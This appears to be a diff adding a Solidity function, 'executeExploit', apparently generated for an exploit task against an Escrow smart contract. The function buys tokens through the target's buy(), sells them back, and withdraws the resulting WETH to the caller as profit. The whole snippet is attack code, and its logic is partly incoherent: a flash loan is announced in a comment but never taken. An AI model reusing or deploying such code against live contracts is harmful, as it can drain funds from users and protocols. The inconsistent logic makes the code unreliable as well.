@@ -1,0 +1,40 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Start flash loan process
+    // Initialize the necessary parameters for the buy operation
+    address[] memory recipients = new address[](1);
+    recipients[0] = address(this);
+    
+    uint256[] memory amountsIn = new uint256[](1);
+    amountsIn[0] = amount; // Amount of valuableToken we're planning to buy
+
+    uint256[] memory maxOuts = new uint256[](1);
+    maxOuts[0] = type(uint256).max; // Allow any amount to be returned from the swap
+
+    // Approving WETH for the router
+    IWETH(WETH).approve(router, amount);
+
+    // Execute the buy function from the Escrow contract
+    IEscrow(target).buy(token, recipients, amountsIn, maxOuts);
+    
+    // We should now have tokens, proceed to sell them back
+    // The goal here is to sell the tokens we've just bought back to WETH
+    address[] memory sellers = new address[](1);
+    sellers[0] = address(this);
+
+    uint256[] memory amountsOut = new uint256[](1);
+    amountsOut[0] = IERC20(token).balanceOf(address(this)); // We're going to sell all the tokens we received
+
+    // Sell the tokens back to get WETH
+    IEscrow(target).sell(token, sellers, amountsOut, false);
+    
+    // Attempt to withdraw profits
+    uint256 profit = IWETH(WETH).balanceOf(address(this));
+    // Ensure we can withdraw the profit
+    if (profit > 0) {
+        IEscrow(target).withdraw(msg.sender, profit); // Withdraw the profit to the original sender
+    }
+}
+</executeExploitCode>
+```
